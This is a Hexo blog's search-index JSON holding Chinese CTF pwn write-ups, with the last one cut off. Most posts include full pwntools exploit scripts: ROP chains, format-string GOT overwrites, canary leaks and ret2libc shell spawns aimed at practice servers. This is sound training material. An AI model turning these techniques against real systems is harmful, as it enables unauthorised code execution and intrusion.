{"meta":{"title":"Hexo","subtitle":"","description":"","author":"WuXianKwY","url":"https://WuXianKwY.github.io","root":"/"},"pages":[{"title":"PY","date":"2023-08-25T09:06:05.432Z","updated":"2023-08-25T09:06:05.432Z","comments":true,"path":"PY/index.html","permalink":"https://wuxiankwy.github.io/PY/index.html","excerpt":"","text":""},{"title":"archives","date":"2023-08-25T08:18:58.000Z","updated":"2023-08-25T08:18:58.501Z","comments":true,"path":"archives/index.html","permalink":"https://wuxiankwy.github.io/archives/index.html","excerpt":"","text":""},{"title":"文章归档","date":"2023-08-25T08:52:21.586Z","updated":"2023-08-25T08:52:21.586Z","comments":true,"path":"archive/index.html","permalink":"https://wuxiankwy.github.io/archive/index.html","excerpt":"","text":""},{"title":"donate","date":"2023-08-25T09:04:16.000Z","updated":"2023-08-25T09:04:16.479Z","comments":true,"path":"donate/index.html","permalink":"https://wuxiankwy.github.io/donate/index.html","excerpt":"","text":""}],"posts":[{"title":"攻防世界——Recho","slug":"攻防世界——Recho","date":"2023-10-16T12:00:00.000Z","updated":"2023-10-16T11:51:04.788Z","comments":true,"path":"2023/10/16/攻防世界——Recho/","link":"","permalink":"https://wuxiankwy.github.io/2023/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94Recho/","excerpt":"","text":"攻防世界——Rechochecksec 123456789101112131415161718192021// local variable allocation has failed, the output may be wrong!int __cdecl main(int argc, const char **argv, const char **envp)&#123; char nptr; // [rsp+0h] [rbp-40h] char buf[40]; // [rsp+10h] [rbp-30h] int v6; // [rsp+38h] [rbp-8h] int v7; // [rsp+3Ch] [rbp-4h] Init(*(_QWORD *)&amp;argc, argv, envp); write(1, &quot;Welcome to Recho server!\\n&quot;, 0x19uLL); while ( read(0, &amp;nptr, 0x10uLL) &gt; 0 ) &#123; v7 = atoi(&amp;nptr); if ( v7 &lt;= 15 ) v7 = 16; v6 = read(0, buf, v7); buf[v6] = 0; printf(&quot;%s&quot;, buf); &#125; return 0;&#125; 代码大意是读入一个数据的长度，再将数据存入buf数组。 先进行数据长度的判断，若长度小于16，则将数据存入buf数组，并在末尾添加\\0。 string发现flag字符串 1234567891011121314151617LOAD:0000000000400238 0000001C C /lib64/ld-linux-x86-64.so.2LOAD:00000000004003E9 0000000A C libc.so.6LOAD:00000000004003F3 00000006 C stdinLOAD:00000000004003F9 00000007 C printfLOAD:0000000000400400 00000005 C readLOAD:0000000000400405 00000007 C stdoutLOAD:000000000040040C 00000007 C stderrLOAD:0000000000400413 00000006 C alarmLOAD:0000000000400419 00000005 C atoiLOAD:000000000040041E 00000008 C setvbufLOAD:0000000000400426 00000012 C __libc_start_mainLOAD:0000000000400438 00000006 C writeLOAD:000000000040043E 0000000F C __gmon_start__LOAD:000000000040044D 0000000C C GLIBC_2.2.5.rodata:00000000004008C4 0000001A C Welcome to Recho server!\\n.eh_frame:0000000000400987 00000006 C ;*3$\\&quot;.data:0000000000601058 00000005 C flag 乍一看可以直接进行libc栈溢出，可是发现while条件中read（）无限满足条件循环，而构造system需要返回main进行两次溢出，所以放弃这种思路 该怎么办呢？pwntools提供了一个shutdown()命令，可以跳出正在执行的循环，但是这也限制我们只能进行一次流程的溢出，而不能返回main进行二次sendline. 正好发现函数中有alarm()函数，而alarm后0x5的地方是syscall，可以进行系统调用进行栈溢出，从而获得flag 1234567891011121314──────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────── ► 0x7ffff7cea540 &lt;alarm&gt; endbr64 0x7ffff7cea544 &lt;alarm+4&gt; mov eax, 0x25 0x7ffff7cea549 &lt;alarm+9&gt; syscall 0x7ffff7cea54b &lt;alarm+11&gt; cmp rax, -0xfff 0x7ffff7cea551 &lt;alarm+17&gt; jae alarm+20 &lt;alarm+20&gt; 0x7ffff7cea553 &lt;alarm+19&gt; ret 0x7ffff7cea554 &lt;alarm+20&gt; mov rcx, qword ptr [rip + 0x12e8b5] 0x7ffff7cea55b &lt;alarm+27&gt; neg eax 0x7ffff7cea55d &lt;alarm+29&gt; mov dword ptr fs:[rcx], eax 0x7ffff7cea560 &lt;alarm+32&gt; or rax, 0xffffffffffffffff 0x7ffff7cea564 &lt;alarm+36&gt; ret 如何让alarm()的got表上的地址增加0x5呢？，在ida中可以找到这么一段代码 1234.text:000000000040070D ; ---------------------------------------------------------------------------.text:000000000040070D add [rdi], al.text:000000000040070F retn.text:0000000000400710 ; --------------------------------------------------------------------------- 意为给rdi中存入的地址增加al个字节，只需将al赋值为0x5，就可实现syscall系统调用 一切准备就绪，接下来开始构造payload进行溢出 123payload = b&#x27;a&#x27;*0x38payload += p64(pop_rdi) + p64(alarm_got) + p64(pop_rax) + p64(0x5) + p64(rdi_al)#调用syscall 12payload += p64(pop_rsi) + p64(0) + b&#x27;deadbeef&#x27; + p64(pop_rdi) + p64(flag_addr) + p64(pop_rax) + p64(0x2) +p64(alarm_addr)#调用fd = open(&#x27;flag&#x27;,READONLY) 123payload += p64(pop_rdx) + p64(0x50) + p64(pop_rsi) + p64(bss_addr+0x100) +b&#x27;deadbeef&#x27;+ p64(pop_rdi) +p64(3) + p64(read_addr)#调用read(0x50,bss_addr+0x100,3)#通常open打开的文件从第三个数据开始读写，前两个数据被占用 12payload += p64(pop_rdi) + p64(bss_addr+0x100) + p64(printf_addr)#调用printf exp: 123456789101112131415161718192021222324252627from pwn import *from LibcSearcher import *p = remote(&quot;61.147.171.105&quot;,64963)elf = ELF(&#x27;./recho&#x27;)pop_rax = 0x4006fcpop_rdi = 0x4008a3pop_rsi = 0x4008a1pop_rdx = 0x4006ferdi_al = 0x40070Dflag_addr = 0x601058bss_addr = 0x601060read_addr = elf.plt[&#x27;read&#x27;]printf_addr = elf.plt[&#x27;printf&#x27;]alarm_addr = elf.plt[&#x27;alarm&#x27;]alarm_got = elf.got[&#x27;alarm&#x27;]payload = b&#x27;a&#x27;*0x38payload += p64(pop_rdi) + p64(alarm_got) + p64(pop_rax) + p64(0x5) + p64(rdi_al)payload += p64(pop_rsi) + p64(0) + b&#x27;deadbeef&#x27; + p64(pop_rdi) + p64(flag_addr) + p64(pop_rax) + p64(0x2) +p64(alarm_addr)payload += p64(pop_rdx) + p64(0x50) + p64(pop_rsi) + p64(bss_addr+0x100) +b&#x27;deadbeef&#x27;+ p64(pop_rdi) +p64(3) + p64(read_addr)payload += p64(pop_rdi) + p64(bss_addr+0x100) + p64(printf_addr)payload = payload.ljust(0x200,b&#x27;\\0&#x27;)p.sendline(str(0x200))p.sendline(payload)p.recv()p.shutdown() p.interactive() 由于payload长度过长，可以使用ljust对齐来防止缓存异常，最后接收flag","categories":[],"tags":[]},{"title":"每日一题——welpwn","slug":"每日一题——welpwn","date":"2023-09-21T12:00:00.000Z","updated":"2023-09-21T12:08:53.218Z","comments":true,"path":"2023/09/21/每日一题——welpwn/","link":"","permalink":"https://wuxiankwy.github.io/2023/09/21/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%E2%80%94%E2%80%94welpwn/","excerpt":"","text":"每日一题——welpwn这道题是这几天来做的问题比较多的题，好多细节还是理解不到位checksecArch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 什么都没开 反编译后感觉很简单，但是read不能溢出 12345678910int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf; // [rsp+0h] [rbp-400h] write(1, &quot;Welcome to RCTF\\n&quot;, 0x10uLL); fflush(_bss_start); read(0, &amp;buf, 0x400uLL); echo((__int64)&amp;buf); return 0;&#125; 进入echo()看看 1234567891011121314int __fastcall echo(__int64 a1)&#123; char s2[16]; // [rsp+10h] [rbp-10h] for ( i = 0; *(_BYTE *)(i + a1); ++i ) s2[i] = *(_BYTE *)(i + a1); s2[i] = 0; if ( !strcmp(&quot;ROIS&quot;, s2) ) &#123; printf(&quot;RCTF&#123;Welcome&#125;&quot;, s2); puts(&quot; is not flag&quot;); &#125; return printf(&quot;%s&quot;, s2);&#125; s2允许输入16个数据，但是有0x400的传入空间，可以进行栈溢出，但是执行一遍发现不行，观察到s2中不能有0出现，而栈溢出中构造的ROP链都有0，所以要另辟蹊径。 如何将rop链传入s2且不被检测到0呢？观察ida中的栈结构发现，echo栈就在main函数上面，二者栈是相连的，我们只需要在buf区构造rop链，然后在buf区利用pop执行所需命令，将rop链先存入payload的底部部分，上方用垃圾数据填充。当echo进行复制时，复制到pop4_ret停止，之后buf区的pop4将前4个栈区弹出，从而执行rop命令，获得got地址进行常规libc 之后再相同格式调用system和bin_sh exp: 12345678910111213141516171819202122from pwn import *from LibcSearcher import *elf = ELF(&#x27;./wel&#x27;)p = remote(&quot;61.147.171.105&quot;,53215)pop4_ret = 0x40089cpop_rdi = 0x4008a3main_addr = 0x4007CDread_got = elf.got[&#x27;read&#x27;]put_plt = elf.plt[&#x27;puts&#x27;]payload = flat([b&#x27;a&#x27;*0x18,p64(pop4_ret),p64(pop_rdi),p64(read_got),p64(put_plt),p64(main_addr)])p.recvuntil(b&#x27;to RCTF\\n&#x27;)p.sendline(payload)p.recvuntil(b&#x27;a&#x27;*0x18)p.recv(3)read_addr = u64(p.recv(6).ljust(8, b&quot;\\x00&quot;))libc = LibcSearcher(&quot;read&quot;,read_addr)libc_base = read_addr - libc.dump(&quot;read&quot;)system_addr = libc_base + libc.dump(&quot;system&quot;)bin_sh = libc_base + libc.dump(&quot;str_bin_sh&quot;)payload = flat([b&#x27;a&#x27;*0x18,p64(pop4_ret),p64(pop_rdi),p64(bin_sh),p64(system_addr)])p.sendline(payload)p.interactive() 注： p.recv(3)是用来接收printf打印的pop4_ret，ljust(8, b”\\x00”)是64位程序需要的格式。","categories":[],"tags":[]},{"title":"每日一题——数据实时监测","slug":"每日一题——数据实时监测","date":"2023-09-18T12:00:00.000Z","updated":"2023-09-18T12:01:07.455Z","comments":true,"path":"2023/09/18/每日一题——数据实时监测/","link":"","permalink":"https://wuxiankwy.github.io/2023/09/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E5%AE%9E%E6%97%B6%E7%9B%91%E6%B5%8B/","excerpt":"","text":"每日一题——数据实时监测checksec查看，啥都没开 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments ida查看，发现locker内直接有shell，需要我们改变key的值，盲猜一手字符串漏洞 12345678910111213int locker()&#123; int result; // eax char s; // [esp+0h] [ebp-208h] fgets(&amp;s, 512, stdin); imagemagic(&amp;s); if ( key == 35795746 ) result = system(&quot;/bin/sh&quot;); else result = printf(format, &amp;key, key); return result;&#125; 果然找到了printf在imagemagic() 1234int __cdecl imagemagic(char *format)&#123; return printf(format);&#125; 这里需要用到pwntools的利器fmtstr_payload简化对格式化字符串漏洞的构造工作. fmtstr_payload(offset, writes, numbwritten&#x3D;0, write_size&#x3D;‘byte’) 第一个参数表示格式化字符串的偏移； 第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成{printfGOT: systemAddress}；本题是将0804a048处改为0x2223322 第三个参数表示已经输出的字符个数，这里没有，为0，采用默认值即可； 第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写。 fmtstr_payload函数返回的就是payload gdb运行下查看偏移量 1234AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%pAAAA-0xf7fd8ff4-0xffffd0f0-0xf7e2a000-0xffffd184-0xf7ffcb80-0xffffd0a8-0x80484e7-0xffffcea0-0x200-0xf7e2a620-0x30e9-0x41414141-0x2d70252dThe location of key is 0804a048, and its value is 00000000,not the 0x02223322. (╯°Д°)╯︵ ┻━┻[Inferior 1 (process 3710) exited normally] exp:1234567from pwn import *p = remote(&quot;61.147.171.105&quot;,49155)key_addr = 0x804A048key = 0x2223322payload = fmtstr_payload(12,&#123;key_addr:key&#125;)p.sendline(payload)p.interactive()","categories":[],"tags":[]},{"title":"每日一题——ret2libc3练习","slug":"每日一题——ret2libc3练习","date":"2023-09-14T12:30:00.000Z","updated":"2023-09-14T12:30:41.496Z","comments":true,"path":"2023/09/14/每日一题——ret2libc3练习/","link":"","permalink":"https://wuxiankwy.github.io/2023/09/14/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%E2%80%94%E2%80%94ret2libc3%E7%BB%83%E4%B9%A0/","excerpt":"","text":"每日一题——ret2libc3练习攻防世界pwn200 checksec 123456[*] &#x27;/home/wuxiankwy/123&#x27; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) ida反编译 12345678910111213141516171819202122int __cdecl main()&#123; int buf; // [esp+2Ch] [ebp-6Ch] int v2; // [esp+30h] [ebp-68h] int v3; // [esp+34h] [ebp-64h] int v4; // [esp+38h] [ebp-60h] int v5; // [esp+3Ch] [ebp-5Ch] int v6; // [esp+40h] [ebp-58h] int v7; // [esp+44h] [ebp-54h] buf = 1668048215; v2 = 543518063; v3 = 1478520692; v4 = 1179927364; v5 = 892416050; v6 = 663934; memset(&amp;v7, 0, 0x4Cu); setbuf(stdout, (char *)&amp;buf); write(1, &amp;buf, strlen((const char *)&amp;buf)); sub_8048484(); return 0;&#125; F12未发现system和bin&#x2F;sh 典型的ret2libc3模板题 123456789101112LOAD:08048154 00000013 C /lib/ld-linux.so.2LOAD:08048269 0000000F C __gmon_start__LOAD:08048278 0000000A C libc.so.6LOAD:08048282 0000000F C _IO_stdin_usedLOAD:08048291 00000006 C stdinLOAD:08048297 00000005 C readLOAD:0804829C 00000007 C stdoutLOAD:080482A3 00000007 C setbufLOAD:080482AA 00000012 C __libc_start_mainLOAD:080482BC 00000006 C writeLOAD:080482C2 0000000A C GLIBC_2.0.eh_frame:080486B3 00000005 C ;*2$\\&quot; 发现存在read和write函数，跟进去看看 1234567ssize_t sub_8048484()&#123; char buf; // [esp+1Ch] [ebp-6Ch] setbuf(stdin, &amp;buf); return read(0, &amp;buf, 0x100u);&#125; read用于栈溢出写入write的plt，从而调用write自己打印出got地址，最后利用libcsearcher找出偏移调用system。 gdb计算溢出112，然后直接写exp。 123456789pwndbg&gt; rStarting program: /home/wuxiankwy/123 [Thread debugging using libthread_db enabled]Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.Welcome to XDCTF2015~!aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabProgram received signal SIGSEGV, Segmentation fault.0x62616164 in ?? () 1234*EIP 0x62616164 (&#x27;daab&#x27;)pwndbg&gt; cyclic -l daabFinding cyclic pattern of 4 bytes: b&#x27;daab&#x27; (hex: 0x64616162)Found at offset 112 EXP: 123456789101112131415161718from pwn import *from LibcSearcher import *context.log_level=&quot;debug&quot;p = remote(&quot;61.147.171.105&quot;,54514)elf = ELF(&#x27;./pwn200&#x27;)main_addr = 0x80484BEwrite_plt = elf.plt[&#x27;write&#x27;]write_got = elf.got[&#x27;write&#x27;]payload = flat([b&#x27;a&#x27;*(112),p32(write_plt),p32(main_addr),p32(1),p32(write_got),p32(4)])p.sendline(payload)write_addr = u32(p.recvuntil(&#x27;\\xf7&#x27;)[-4:])libc = LibcSearcher(&#x27;write&#x27;,write_addr)libc_base = write_addr - libc.dump(&#x27;write&#x27;)system=libc_base+libc.dump(&#x27;system&#x27;)bin_sh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)payload = flat([b&#x27;a&#x27;*(112),p32(system),p32(4),p32(bin_sh)])p.sendline(payload)p.interactive() 遇到的问题： 刚开始接收write_addr用的是recv(4)，发现libc报错No matched libc, please add more libc or try others，然后debug调试发现 123456[DEBUG] Sent 0x85 bytes: 00000000 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 │aaaa│aaaa│aaaa│aaaa│ * 00000070 c0 83 04 08 be 84 04 08 01 00 00 00 10 a0 04 08 │····│····│····│····│ 00000080 04 00 00 00 0a │····│·│ 00000085 改用 1recvuntil(&#x27;\\xf7&#x27;)[-4:] 这里的xf7是0x7f的缩写，即代表取0x70行末尾往前的4个字节，但是不太明白为什么是末尾向前取四个字节（待解决） 最后cat flag","categories":[],"tags":[]},{"title":"利用已知函数的真实地址查找偏移","slug":"ret2libc3——利用已知函数的真实地址查找偏移","date":"2023-09-10T08:47:57.000Z","updated":"2023-09-10T08:52:22.236Z","comments":true,"path":"2023/09/10/ret2libc3——利用已知函数的真实地址查找偏移/","link":"","permalink":"https://wuxiankwy.github.io/2023/09/10/ret2libc3%E2%80%94%E2%80%94%E5%88%A9%E7%94%A8%E5%B7%B2%E7%9F%A5%E5%87%BD%E6%95%B0%E7%9A%84%E7%9C%9F%E5%AE%9E%E5%9C%B0%E5%9D%80%E6%9F%A5%E6%89%BE%E5%81%8F%E7%A7%BB/","excerpt":"","text":"ret2libc3——利用已知函数的真实地址查找偏移​ 当动态连接程序中不存在system函数与binsh的地址时，因为同一个libc版本的函数的两个库函数在libc中的相对位置不会改变，可以根据程序中已知函数（已经执行过的函数）的got（真实）地址来查找其与system真实地址的偏移量。 ​ 解释：一个函数被调用过以后，got表里保存了它在内存中的地址，可以通过泄露got表内存来泄露函数地址，就可以根据其与libc中该函数的偏移计算其他函数在内存空间中的地址。因为libc中任意两个函数之间的偏移是固定的。 A真实地址-A的偏移地址 &#x3D; B真实地址-B的偏移地址 &#x3D; 基地址 pwntools快速查找已知函数的plt地址的方式：objdump -d filename | grep ‘plt’ 查找函数got表方式：objdump -R fliename 在ret2libc3中遇到的返回函数的问题——返回到main和start的区别：​ 首先理解，栈的内存增长方式是向下的，即调用的函数越多，内存占用越少，start函数是系统代码的入口，是程序真正的入口，其中包括了对mian()函数的调用；main()函数是用户代码的入口，是对用户而言的。二者都是程序的入口，只是面向的对象不同。 ​ 观察start()函数的汇编指令可发现，其不仅调用了main()函数，还使用了 and esp 0xFFFFFFF0进行了栈对齐，因为0xFFFFFFF0 &#x3D; 11111111 11111111 11111111 11110000 所以可以使esp中的后四位为零，便于CPU访问地址，提高效率。 ​ 所以，因为调用了and esp指令，使得start中多了一个and操作，若直接调用main函数，相当于少了and操作，esp多了8，栈内存反向减少8，所以main相对于start函数栈空间少了8，故执行栈溢出时少溢出8个内存。","categories":[],"tags":[]},{"title":"栈溢出中遇到的函数学习与总结","slug":"栈溢出中遇到的函数学习与总结","date":"2023-08-25T08:47:57.000Z","updated":"2023-08-25T07:56:15.320Z","comments":true,"path":"2023/08/25/栈溢出中遇到的函数学习与总结/","link":"","permalink":"https://wuxiankwy.github.io/2023/08/25/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%87%BD%E6%95%B0%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%80%BB%E7%BB%93/","excerpt":"","text":"栈溢出中遇到的函数学习与总结fgets()函数：原型：1char *fgets(char *str, int n, FILE *stream) 作用：从指定的流 stream 读取一行，并把它存储在 str 所指向的字符串内。当读取 (n-1) 个字符时，或者读取到换行符时，或者到达文件末尾时，它会停止，具体视情况而定。 fopen()函数：原型：1FILE *fopen(const char *filename, const char *mode) 作用：使用给定的模式 mode 打开 filename 所指向的文件。 write()函数原型： 12345ssize_t write(int fd,const void*buf,size_t count);参数说明： fd:是文件描述符（write所对应的是写，即就是1） buf:通常是一个字符串，需要写入的字符串 count：是每次写入的字节数 返回值:12成功：返回写入的字节数失败：返回-1并设置errno read()函数原型：123456ssize_t read(int fd,void*buf,size_t count)参数说明：fd: 是文件描述符buf: 为读出数据的缓冲区；count: 为每次读取的字节数（是请求读取的字节数，读上来的数据保 存在缓冲区buf中，同时文件的当前读写位置向后移） 返回值：123成功：返回读出的字节数失败：返回-1，并设置errno，如果在调用read 之前到达文件末尾，则这次read返回0 execve()函数原型：1int execve(const char * filename,char * const argv[ ],char * const envp[ ]) 作用：execve()用来执行参数filename字符串所代表的文件路径，第二个参数是利用指针数组来传递给执行文件，并且需要以空指针(NULL)结束，最后一个参数则为传递给执行文件的新环境变量数组。 printf()函数原型：1printf(&quot;%d %d %d ......&quot;,count,count,count,count,count,......); 作用：将任意数量的参数压入栈中，函数在调用的过程中，传入函数的参数从右到左逐个压入栈中。","categories":[],"tags":[]},{"title":"not_the_same_3dsctf_2016——练习","slug":"not_the_same_3dsctf_2016——练习","date":"2023-08-23T08:47:57.000Z","updated":"2023-08-23T11:12:59.329Z","comments":true,"path":"2023/08/23/not_the_same_3dsctf_2016——练习/","link":"","permalink":"https://wuxiankwy.github.io/2023/08/23/not_the_same_3dsctf_2016%E2%80%94%E2%80%94%E7%BB%83%E4%B9%A0/","excerpt":"","text":"not_the_same_3dsctf_2016checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) IDA32反编译，是静态编译 main函数没有什么端倪，但是发现这里的main没有ebp 12345678910111213141516171819202122.text:080489E0.text:080489E0.text:080489E0 ; int __cdecl main(int argc, const char **argv, const char **envp).text:080489E0 public main.text:080489E0 main proc near ; DATA XREF: _start+17↑o.text:080489E0.text:080489E0 var_3C = dword ptr -3Ch.text:080489E0 var_2D = byte ptr -2Dh.text:080489E0 argc = dword ptr 4.text:080489E0 argv = dword ptr 8.text:080489E0 envp = dword ptr 0Ch.text:080489E0.text:080489E0 sub esp, 3Ch.text:080489E3 mov [esp+3Ch+var_3C], offset aB0r4V3rS37u4hO ; &quot;b0r4 v3r s3 7u 4h o b1ch4o m3m0... &quot;.text:080489EA call printf.text:080489EF lea eax, [esp+3Ch+var_2D].text:080489F3 mov [esp+3Ch+var_3C], eax.text:080489F6 call gets.text:080489FB xor eax, eax.text:080489FD add esp, 3Ch.text:08048A00 retn &lt;--.text:08048A00 main endp 注意栈溢出时不需要再覆盖ebp的四个值 找了一会没有找到和system，bin有关的函数和字符串，但在字符串区发现了flag.text 12345.rodata:080BC2A8 00000009 C flag.txt.rodata:080BC2B1 00000024 C b0r4 v3r s3 7u 4h o b1ch4o m3m0... .rodata:080BC2D5 00000014 C ../csu/libc-start.c.rodata:080BC2E9 00000017 C FATAL: kernel too old\\n.rodata:080BC300 00000030 C __ehdr_start.e_phentsize == sizeof *GL(dl_phdr) 跟进去看看 CTRL+C进入调用函数get_secret() 12345678int get_secret()&#123; int v0; // esi v0 = fopen(&quot;flag.txt&quot;, &amp;unk_80CF91B); fgets(&amp;fl4g, 45, v0); return fclose(v0);&#125; 分析函数，flag被储存在fl4g里，找到fl4g的bss地址:080ECA2D，进行栈溢出 1234.bss:080ECA2C db ? ;.bss:080ECA2D public fl4g.bss:080ECA2D fl4g db ? ; ; DATA XREF: get_secret+26↑o.bss:080ECA2E db ? ; 需要把flag打印出来，这里可以用print，put，write函数 想到main里就摆着一个printf，直接调用它打印，至于其他函数，有则可用 12345678int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [esp+Fh] [ebp-2Dh] printf((int)&quot;b0r4 v3r s3 7u 4h o b1ch4o m3m0... &quot;); gets(&amp;v4); return 0;&#125; 编写exp： 123456789101112from pwn import *p = remote(&quot;node4.buuoj.cn&quot;,26828)elf = ELF(&quot;./NTS&quot;)flag_addr = 0x080ECA2Dsecret_addr = 0x080489A0printf_addr = 0x0804F0A0payload = 0x2d * b&#x27;a&#x27; + p32(secret_addr) + p32(printf_addr) + p32(elf.sym[&#x27;exit&#x27;]) + p32(flag_addr)p.sendline(payload)p.interactive() 补充：这里的flag在缓冲区，需要程序结束printf才能打印缓冲区的内容，所以额外调用了exit.","categories":[],"tags":[]},{"title":"ciscn_2019_ne_5","slug":"ciscn-2019-ne-5","date":"2023-08-11T09:38:11.000Z","updated":"2023-08-11T09:58:18.292Z","comments":true,"path":"2023/08/11/ciscn-2019-ne-5/","link":"","permalink":"https://wuxiankwy.github.io/2023/08/11/ciscn-2019-ne-5/","excerpt":"","text":"ciscn_2019_ne_5checksec一下 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) F12查字符串发现与flag有关的字符串，告诉我们咱们输入的log就是字符串 1234567.rodata:080489DB 00000006 C %128s.rodata:080489E1 00000014 C echo Printing.......rodata:080489F5 00000019 C The flag is your log:%s\\n.rodata:08048A0E 00000014 C Welcome to use LFS..rodata:08048A22 0000001D C Please input admin password:.rodata:08048A3F 00000006 C %100s.rodata:08048A45 0000000E C administrator log在哪输入呢？反编译main看看代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v3; // [esp+0h] [ebp-100h] char src[4]; // [esp+4h] [ebp-FCh] char v5; // [esp+8h] [ebp-F8h] char s1[4]; // [esp+84h] [ebp-7Ch] char v7; // [esp+88h] [ebp-78h] const char *v8; // [esp+E8h] [ebp-18h] int *v9; // [esp+ECh] [ebp-14h] int *v10; // [esp+F4h] [ebp-Ch] v10 = &amp;argc; setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); fflush(stdout); *(_DWORD *)s1 = 48; memset(&amp;v7, 0, 0x60u); *(_DWORD *)src = 48; memset(&amp;v5, 0, 0x7Cu); puts(&quot;Welcome to use LFS.&quot;); printf(&quot;Please input admin password:&quot;); __isoc99_scanf(); if ( strcmp(s1, &quot;administrator&quot;) ) &#123; puts(&quot;Password Error!&quot;); exit(0); &#125; puts(&quot;Welcome!&quot;); while ( 1 ) &#123; puts(&quot;Input your operation:&quot;); puts(&quot;1.Add a log.&quot;); puts(&quot;2.Display all logs.&quot;); puts(&quot;3.Print all logs.&quot;); printf(&quot;0.Exit\\n:&quot;); v9 = &amp;v3; v8 = &quot;%d&quot;; __isoc99_scanf(); switch ( v3 ) &#123; case 0: exit(0); return; case 1: AddLog(src); break; case 2: Display(src); break; case 3: Print(); break; case 4: GetFlag(src); break; default: continue; &#125; &#125;&#125; 这里不知道为什么scanf不显示读入的数据和长度，又去汇编看了下是100个长度，读入s1，可以栈溢出 之前字符串里注意到有system函数，直接查地址调用 123LOAD:08048321 00000007 C stderrLOAD:08048328 00000007 C systemLOAD:0804832F 00000007 C setbuf ropper搜不到&#x2F;bin&#x2F;sh但是找到了sh字段，查了下可以当作&#x2F;bin&#x2F;sh用 shell_addr=0x80482ea 之后构造俺们的payload 1payload=b‘a’*（0x48+4）+p32(system_addr)+b‘aaaa’+p32(shell_addr) 发送payload后根据题意选4让系统调用我们的”log”从而获取shell exp： 12345678910111213141516171819202122from pwn import*r=remote(&quot;node4.buuoj.cn&quot;,29749)elf=ELF(&#x27;n5&#x27;)system_addr=elf.sym[&#x27;system&#x27;]shell_addr=0x80482ear.recvuntil(&#x27;Please input admin password:&#x27;)r.sendline(&#x27;administrator&#x27;)r.recvuntil(&#x27;0.Exit\\n:&#x27;)r.sendline(&#x27;1&#x27;)payload=b&#x27;a&#x27;*(0x48+4)+p32(system_addr)+b&#x27;1234&#x27;+p32(shell_addr)r.recvuntil(&#x27;Please input new log info:&#x27;)r.sendline(payload)r.recvuntil(&#x27;0.Exit\\n:&#x27;)r.sendline(&#x27;4&#x27;)r.interactive()","categories":[],"tags":[]},{"title":"CTF-WP","slug":"CTF-WP","date":"2023-08-11T08:47:57.000Z","updated":"2023-08-11T08:57:20.920Z","comments":true,"path":"2023/08/11/CTF-WP/","link":"","permalink":"https://wuxiankwy.github.io/2023/08/11/CTF-WP/","excerpt":"","text":"canarychecksec下，32位，开启canary，NX Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) sym.vuln函数中存在溢出，read可以向0x70的栈中读取0x200的内容, 之后printf会打印read读入的字符串。 开启canary，没法直接栈溢出 第一次溢出 覆写Canary低字节\\x00，读取出Canary值 payload_1 = b&#39;a&#39; * (0x70 - 0xc + 0x1) 第二次溢出 利用泄露的canary进行栈溢出 payload_2 = b&#39;a&#39; * (0x70 - 0xc) + p32(Canary) + b&#39;a&#39; * 0xc + p32(getshell) exp 12345678910111213141516171819from pwn import *context.log_level = &#x27;debug&#x27;io = remote(&quot;xxxx&quot;,xxx)getshell = 0x080491b2io.recvuntil(&#x27;Hello Hacker!\\n&#x27;)payload_1 = b&#x27;a&#x27; * (0x70 - 0xc)io.send(payload_1)recvbytes = conn.recv()canary = u32(recvbytes[0x65:0x68].rjust(4, b&#x27;\\x00&#x27;))print(f&#x27;Canary: &#123;hex(canary)&#125;&#x27;)payload_2 = b&#x27;a&#x27; * (0x70 - 0xc) + p32(canary) + b&#x27;a&#x27; * 0xc + p32(getshell)io.send(payload_2)io.recv()io.interactive() Hello_Worldchecksec走一走 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 32位，只有NX IDA反编译，找到vulnerable_function() ssize_t vulnerable_function()&#123; char buf[136]; // [esp+0h] [ebp-88h] BYREF system(&quot;echo Input:&quot;); return read(0, buf, 0x100u);&#125; buf可以溢出，再看plt表 .plt:08048320 ; Attributes: thunk.plt:08048320.plt:08048320 ; int system(const char *command).plt:08048320 _system proc near ; CODE XREF: vulnerable_function+11↓p.plt:08048320 ; main+1E↓p.plt:08048320 找到system，利用system执行“&#x2F;bin&#x2F;sh” exp： from pwn import * elf = ELF(&quot;./level2&quot;)p = remote(&quot;111.200.241.244&quot; , 64128)#p = process(&quot;./level2&quot;) system_plt = elf.plt[&quot;system&quot;]bin_sh = next(elf.search(b&quot;/bin/sh&quot;))payload = b&#39;a&#39; * ( 0x88 +4) # 